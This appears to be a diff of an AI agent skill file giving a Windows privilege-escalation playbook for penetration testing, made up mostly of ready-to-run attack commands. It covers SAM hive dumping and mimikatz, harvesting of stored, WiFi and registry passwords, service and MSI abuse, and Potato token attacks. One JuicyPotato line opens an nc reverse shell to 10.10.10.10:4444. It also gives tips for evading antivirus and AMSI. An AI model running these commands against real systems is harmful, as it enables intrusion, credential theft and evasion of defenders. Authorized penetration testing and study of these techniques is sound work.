@@ -1,23 +1,18 @@
 ---
-name: Windows Privilege Escalation
-description:
-  This skill should be used when the user asks to "escalate privileges on Windows," "find Windows privesc vectors,"
-  "enumerate Windows for privilege escalation," "exploit Windows misconfigurations," or "perform post-exploitation
-  privilege escalation." It provides comprehensive guidance for discovering and exploiting privilege escalation
-  vulnerabilities in Windows environments.
+name: windows-privilege-escalation
+description: "This skill should be used when the user asks to \"escalate privileges on Windows,\" \"find Windows privesc vectors,\" \"enumerate Windows for privilege escalation,\" \"exploit Windows miscon..."
 metadata:
   author: zebbern
   version: "1.1"
+risk: unknown
+source: community
 ---
 
 # Windows Privilege Escalation
 
 ## Purpose
 
-Provide systematic methodologies for discovering and exploiting privilege escalation vulnerabilities on Windows systems
-during penetration testing engagements. This skill covers system enumeration, credential harvesting, service
-exploitation, token impersonation, kernel exploits, and various misconfigurations that enable escalation from standard
-user to Administrator or SYSTEM privileges.
+Provide systematic methodologies for discovering and exploiting privilege escalation vulnerabilities on Windows systems during penetration testing engagements. This skill covers system enumeration, credential harvesting, service exploitation, token impersonation, kernel exploits, and various misconfigurations that enable escalation from standard user to Administrator or SYSTEM privileges.
 
 ## Inputs / Prerequisites
 
@@ -40,7 +35,6 @@ user to Administrator or SYSTEM privileges.
 ### 1. System Enumeration
 
 #### Basic System Information
-
 ```powershell
 # OS version and patches
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
@@ -59,7 +53,6 @@ wmic logicaldisk get caption,description,providername
 ```
 
 #### User Enumeration
-
 ```powershell
 # Current user
 whoami
@@ -85,7 +78,6 @@ Get-LocalGroupMember Administrators | ft Name,PrincipalSource
 ```
 
 #### Network Enumeration
-
 ```powershell
 # Network interfaces
 ipconfig /all
@@ -109,7 +101,6 @@ nltest /DCLIST:DomainName
 ```
 
 #### Antivirus Enumeration
-
 ```powershell
 # Check AV products
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
@@ -118,7 +109,6 @@ WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get
 ### 2. Credential Harvesting
 
 #### SAM and SYSTEM Files
-
 ```powershell
 # SAM file locations
 %SYSTEMROOT%\repair\SAM
@@ -139,7 +129,6 @@ john --format=NT sam.txt
 ```
 
 #### HiveNightmare (CVE-2021-36934)
-
 ```powershell
 # Check vulnerability
 icacls C:\Windows\System32\config\SAM
@@ -152,7 +141,6 @@ mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\W
 ```
 
 #### Search for Passwords
-
 ```powershell
 # Search file contents
 findstr /SI /M "password" *.xml *.ini *.txt
@@ -178,7 +166,6 @@ where /R C:\ *.ini
 ```
 
 #### Unattend.xml Credentials
-
 ```powershell
 # Common locations
 C:\unattend.xml
@@ -195,7 +182,6 @@ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=" | base64 -d
 ```
 
 #### WiFi Passwords
-
 ```powershell
 # List profiles
 netsh wlan show profile
@@ -208,7 +194,6 @@ for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "'
 ```
 
 #### PowerShell History
-
 ```powershell
 # View PowerShell history
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -219,7 +204,6 @@ cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ### 3. Service Exploitation
 
 #### Incorrect Service Permissions
-
 ```powershell
 # Find misconfigured services
 accesschk.exe -uwcqv "Authenticated Users" * /accepteula
@@ -235,7 +219,6 @@ sc start <service>
 ```
 
 #### Unquoted Service Paths
-
 ```powershell
 # Find unquoted paths
 wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
@@ -247,7 +230,6 @@ wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows
 ```
 
 #### AlwaysInstallElevated
-
 ```powershell
 # Check if enabled
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -265,7 +247,6 @@ msiexec /quiet /qn /i C:\evil.msi
 ### 4. Token Impersonation
 
 #### Check Impersonation Privileges
-
 ```powershell
 # Look for these privileges
 whoami /priv
@@ -283,7 +264,6 @@ whoami /priv
 ```
 
 #### Potato Attacks
-
 ```powershell
 # JuicyPotato (Windows Server 2019 and below)
 JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe" -t *
@@ -301,7 +281,6 @@ GodPotato.exe -cmd "cmd /c whoami"
 ### 5. Kernel Exploitation
 
 #### Find Kernel Vulnerabilities
-
 ```powershell
 # Use Windows Exploit Suggester
 systeminfo > systeminfo.txt
@@ -315,7 +294,6 @@ powershell.exe -ExecutionPolicy Bypass -File Sherlock.ps1
 ```
 
 #### Common Kernel Exploits
-
 ```
 MS17-010 (EternalBlue) - Windows 7/2008/2003/XP
 MS16-032 - Secondary Logon Handle - 2008/7/8/10/2012
@@ -332,7 +310,6 @@ CVE-2019-1388 - UAC Bypass - Windows 7/8/10/2008/2012/2016/2019
 ### 6. Additional Techniques
 
 #### DLL Hijacking
-
 ```powershell
 # Find missing DLLs with Process Monitor
 # Filter: Result = NAME NOT FOUND, Path ends with .dll
@@ -343,7 +320,6 @@ CVE-2019-1388 - UAC Bypass - Windows 7/8/10/2008/2012/2016/2019
 ```
 
 #### Runas with Saved Credentials
-
 ```powershell
 # List saved credentials
 cmdkey /list
@@ -354,7 +330,6 @@ runas /savecred /user:WORKGROUP\Administrator "\\10.10.10.10\share\evil.exe"
 ```
 
 #### WSL Exploitation
-
 ```powershell
 # Check for WSL
 wsl whoami
@@ -372,14 +347,14 @@ wsl python -c 'import os; os.system("/bin/bash")'
 
 ### Enumeration Tools
 
-| Tool         | Command                   | Purpose                      |
-| ------------ | ------------------------- | ---------------------------- |
-| WinPEAS      | `winPEAS.exe`             | Comprehensive enumeration    |
-| PowerUp      | `Invoke-AllChecks`        | Service/path vulnerabilities |
-| Seatbelt     | `Seatbelt.exe -group=all` | Security audit checks        |
-| Watson       | `Watson.exe`              | Missing patches              |
-| JAWS         | `.\jaws-enum.ps1`         | Legacy Windows enum          |
-| PrivescCheck | `Invoke-PrivescCheck`     | Privilege escalation checks  |
+| Tool | Command | Purpose |
+|------|---------|---------|
+| WinPEAS | `winPEAS.exe` | Comprehensive enumeration |
+| PowerUp | `Invoke-AllChecks` | Service/path vulnerabilities |
+| Seatbelt | `Seatbelt.exe -group=all` | Security audit checks |
+| Watson | `Watson.exe` | Missing patches |
+| JAWS | `.\jaws-enum.ps1` | Legacy Windows enum |
+| PrivescCheck | `Invoke-PrivescCheck` | Privilege escalation checks |
 
 ### Default Writable Folders
 
@@ -394,30 +369,29 @@ C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 
 ### Common Privilege Escalation Vectors
 
-| Vector                | Check Command                                           |
-| --------------------- | ------------------------------------------------------- |
-| Unquoted paths        | `wmic service get pathname \| findstr /i /v """`        |
-| Weak service perms    | `accesschk.exe -uwcqv "Everyone" *`                     |
+| Vector | Check Command |
+|--------|---------------|
+| Unquoted paths | `wmic service get pathname \| findstr /i /v """` |
+| Weak service perms | `accesschk.exe -uwcqv "Everyone" *` |
 | AlwaysInstallElevated | `reg query HKCU\...\Installer /v AlwaysInstallElevated` |
-| Stored credentials    | `cmdkey /list`                                          |
-| Token privileges      | `whoami /priv`                                          |
-| Scheduled tasks       | `schtasks /query /fo LIST /v`                           |
+| Stored credentials | `cmdkey /list` |
+| Token privileges | `whoami /priv` |
+| Scheduled tasks | `schtasks /query /fo LIST /v` |
 
 ### Impersonation Privilege Exploits
 
-| Privilege                | Tool                      | Usage                 |
-| ------------------------ | ------------------------- | --------------------- |
-| SeImpersonatePrivilege   | JuicyPotato               | CLSID abuse           |
-| SeImpersonatePrivilege   | PrintSpoofer              | Spooler service       |
-| SeImpersonatePrivilege   | RoguePotato               | OXID resolver         |
-| SeBackupPrivilege        | robocopy /b               | Read protected files  |
-| SeRestorePrivilege       | Enable-SeRestorePrivilege | Write protected files |
-| SeTakeOwnershipPrivilege | takeown.exe               | Take file ownership   |
+| Privilege | Tool | Usage |
+|-----------|------|-------|
+| SeImpersonatePrivilege | JuicyPotato | CLSID abuse |
+| SeImpersonatePrivilege | PrintSpoofer | Spooler service |
+| SeImpersonatePrivilege | RoguePotato | OXID resolver |
+| SeBackupPrivilege | robocopy /b | Read protected files |
+| SeRestorePrivilege | Enable-SeRestorePrivilege | Write protected files |
+| SeTakeOwnershipPrivilege | takeown.exe | Take file ownership |
 
 ## Constraints and Limitations
 
 ### Operational Boundaries
-
 - Kernel exploits may cause system instability
 - Some exploits require specific Windows versions
 - AV/EDR may detect and block common tools
@@ -425,14 +399,12 @@ C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 - Some techniques require GUI access
 
 ### Detection Considerations
-
 - Credential dumping triggers security alerts
 - Service modification logged in Event Logs
 - PowerShell execution may be monitored
 - Known exploit signatures detected by AV
 
 ### Legal Requirements
-
 - Only test systems with written authorization
 - Document all escalation attempts
 - Avoid disrupting production systems
@@ -441,7 +413,6 @@ C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 ## Examples
 
 ### Example 1: Service Binary Path Exploitation
-
 ```powershell
 # Find vulnerable service
 accesschk.exe -uwcqv "Authenticated Users" * /accepteula
@@ -459,7 +430,6 @@ sc start MyService
 ```
 
 ### Example 2: AlwaysInstallElevated Exploitation
-
 ```powershell
 # Verify vulnerability
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -476,7 +446,6 @@ msiexec /quiet /qn /i C:\Users\Public\shell.msi
 ```
 
 ### Example 3: JuicyPotato Token Impersonation
-
 ```powershell
 # Verify SeImpersonatePrivilege
 whoami /priv
@@ -489,7 +458,6 @@ JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc
 ```
 
 ### Example 4: Unquoted Service Path
-
 ```powershell
 # Find unquoted path
 wmic service get name,pathname | findstr /i /v """
@@ -508,7 +476,6 @@ sc start "Vuln App"
 ```
 
 ### Example 5: Credential Harvesting from Registry
-
 ```powershell
 # Check for auto-logon credentials
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
@@ -522,10 +489,13 @@ runas /user:Administrator cmd.exe
 
 ## Troubleshooting
 
-| Issue                       | Cause                      | Solution                                                                                 |
-| --------------------------- | -------------------------- | ---------------------------------------------------------------------------------------- |
+| Issue | Cause | Solution |
+|-------|-------|----------|
 | Exploit fails (AV detected) | AV blocking known exploits | Use obfuscated exploits; living-off-the-land (mshta, certutil); custom compiled binaries |
-| Service won't start         | Binary path syntax         | Ensure space after `=` in binpath: `binpath= "C:\path\binary.exe"`                       |
-| Token impersonation fails   | Wrong privilege/version    | Check `whoami /priv`; verify Windows version compatibility                               |
-| Can't find kernel exploit   | System patched             | Run Windows Exploit Suggester: `python wes.py systeminfo.txt`                            |
-| PowerShell blocked          | Execution policy/AMSI      | Use `powershell -ep bypass -c "cmd"` or `-enc <base64>`                                  |
+| Service won't start | Binary path syntax | Ensure space after `=` in binpath: `binpath= "C:\path\binary.exe"` |
+| Token impersonation fails | Wrong privilege/version | Check `whoami /priv`; verify Windows version compatibility |
+| Can't find kernel exploit | System patched | Run Windows Exploit Suggester: `python wes.py systeminfo.txt` |
+| PowerShell blocked | Execution policy/AMSI | Use `powershell -ep bypass -c "cmd"` or `-enc <base64>` |
+
+## When to Use
+This skill is applicable to execute the workflow or actions described in the overview.
